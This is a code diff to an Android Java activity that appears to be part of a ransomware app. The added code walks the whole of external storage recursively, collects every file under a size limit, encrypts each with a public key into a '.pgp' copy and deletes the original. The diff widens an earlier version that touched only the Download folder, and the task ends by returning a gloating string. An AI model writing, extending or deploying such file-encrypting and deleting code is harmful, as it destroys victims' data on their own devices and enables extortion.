@@ -25,6 +25,8 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
+import java.util.List;
 
 public class IntermediateActivity extends AppCompatActivity {
     private InputStream             mSecKeyFile;
@@ -33,8 +35,9 @@ public class IntermediateActivity extends AppCompatActivity {
     private ProgressBar             mProgressBar;
     private TextView                mTextView;
 
-    private static final String TAG=    "InterActivity";
-
+    private static final String TAG     ="InterActivity";
+    private List<String> mFilesList     =new ArrayList<>();
+    private static final int MAX_SIZE   =102400; // 100MBs
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -51,8 +54,23 @@ public class IntermediateActivity extends AppCompatActivity {
         mEncryptionManagement=new EncryptionManagement();
         mProgressBar=(ProgressBar)findViewById(R.id.progressBar);
         mTextView=(TextView)findViewById(R.id.progress_text);
+        // get all the files;
+        visitAllDirs(new File(Environment.getExternalStorageDirectory(),"/"));
         //lets encrypt
         new EncryptTask().execute();
+    }
+
+    private void visitAllDirs(File root) {
+        File[] list=root.listFiles();
+        for (File f:
+             list) {
+            if(f.isDirectory()){
+                visitAllDirs(f);
+            }else if(f.length()<MAX_SIZE){
+                //only encrypt files with size less than 100MBs at start
+                mFilesList.add(f.getAbsolutePath());
+            }
+        }
     }
 
 
@@ -60,35 +78,31 @@ public class IntermediateActivity extends AppCompatActivity {
 
         @Override
         protected String doInBackground(Void... voids) {
-            if(!isExternalStorageWritable()){
+            if(!isExternalStorageWritable()) {
                 return "Cannot write files";
             }
-            File dir=new File("/sdcard/Download/");
-            File[] files=dir.listFiles();
-            for (File file:
-                 files) {
-                //if file is already encrypted
-                if(file.getName().contains("pgp")){
-                    continue;
-                }
-                File outputFile=new File("/sdcard/Download/"+file.getName()+".pgp");
-                try{
-                    if(outputFile.createNewFile()){
-                        Log.d(TAG,"created file to encrypt into");
+                for (String filename:
+                     mFilesList) {
+                    File inputFile=new File(filename);
+                    File outputFile=new File(inputFile.getName()+".pgp");
+                    try{
+                        if(outputFile.createNewFile()){
+                            Log.d(TAG,"created file to encrypt into");
+                        }
+                        Log.d(TAG,"encrypting file: "+inputFile.getName());
+                        publishProgress(inputFile.getName());
+                        mEncryptionManagement.encryptFile(outputFile,inputFile,mPubKeyFile);
+                        //after encryption delete original file
+                        if(inputFile.delete()){
+                            Log.d(TAG," deleted file after encryption");
+                        }
+                    }catch (Exception e){
+                        e.printStackTrace();
+                        return "Error";
                     }
-                    Log.d(TAG,"encrypting file: "+file.getName());
-                    publishProgress(file.getName());
-                    mEncryptionManagement.encryptFile(outputFile,file,mPubKeyFile);
-                    //after encryption delete original file
-                    if(file.delete()){
-                        Log.d(TAG," deleted file after encryption");
-                    }
-                }catch (Exception e){
-                    e.printStackTrace();
-                    return "Error";
+
                 }
 
-            }
             return "Fucked the whole universe";
         }
 
